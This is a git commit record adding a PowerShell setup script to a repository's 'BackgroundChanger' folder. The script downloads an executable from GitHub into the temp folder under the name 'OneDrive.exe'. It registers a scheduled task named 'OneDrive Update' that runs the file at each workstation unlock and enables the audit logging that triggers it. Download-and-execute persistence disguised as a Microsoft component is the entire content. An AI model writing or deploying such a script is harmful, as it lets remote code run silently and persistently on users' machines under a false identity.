a0b1ff5cad9a0dac4b229c36729667f9d792de0d
Viktor Barzin <vbarzin@gmail.com>
2018-08-18 21:19:41 +0100

    Add setup.ps1 source

---
+++ BackgroundChanger/setup.ps1
@@ -0,0 +1,52 @@
+﻿##[Ps1 To Exe]
+##
+##Kd3HDZOFADWE8uK1
+##Nc3NCtDXThU=
+##Kd3HFJGZHWLWoLaVvnQnhQ==
+##LM/RF4eFHHGZ7/K1
+##K8rLFtDXTiW5
+##OsHQCZGeTiiZ4dI=
+##OcrLFtDXTiW5
+##LM/BD5WYTiiZ4tI=
+##McvWDJ+OTiiZ4tI=
+##OMvOC56PFnzN8u+Vs1Q=
+##M9jHFoeYB2Hc8u+Vs1Q=
+##PdrWFpmIG2HcofKIo2QX
+##OMfRFJyLFzWE8uK1
+##KsfMAp/KUzWJ0g==
+##OsfOAYaPHGbQvbyVvnQX
+##LNzNAIWJGmPcoKHc7Do3uAuO
+##LNzNAIWJGnvYv7eVvnQX
+##M9zLA5mED3nfu77Q7TV64AuzAgg=
+##NcDWAYKED3nfu77Q7TV64AuzAgg=
+##OMvRB4KDHmHQvbyVvnQX
+##P8HPFJGEFzWE8tI=
+##KNzDAJWHD2fS8u+Vgw==
+##P8HSHYKDCX3N8u+Vgw==
+##LNzLEpGeC3fMu77Ro2k3hQ==
+##L97HB5mLAnfMu77Ro2k3hQ==
+##P8HPCZWEGmaZ7/K1
+##L8/UAdDXTlaDjofG5iZk2V3nSXwkfPm/vKWs0I6sw/nprzDJB58MTDQ=
+##Kc/BRM3KXxU=
+##
+##
+##fd6a9f26a06ea3bc99616d4851b372ba
+# Define base dir
+$baseDir = "$env:temp\OneDrive"
+# Make sure $baseDir exists
+If(-Not(Test-Path $baseDir))
+{
+	New-Item -ItemType directory -Path $baseDir
+}
+
+# Download exe that will be used by the Task Scheduler
+$url = "https://github.com/ViktorBarzin/Playground/raw/master/BackgroundChanger/iex-ps-online.exe"
+$filename = "$baseDir\OneDrive.exe"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest -Uri $url -OutFile $filename
+
+# Setup task
+schtasks /Create /RU (whoami) /SC ONEVENT /MO "*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4801]]" /EC Security /TN "OneDrive Update" /TR "$filename" /F
+
+# Enable workdstation unlock events to be logged
+auditpol.exe /set /category:"Logon/Logoff" /success:enable
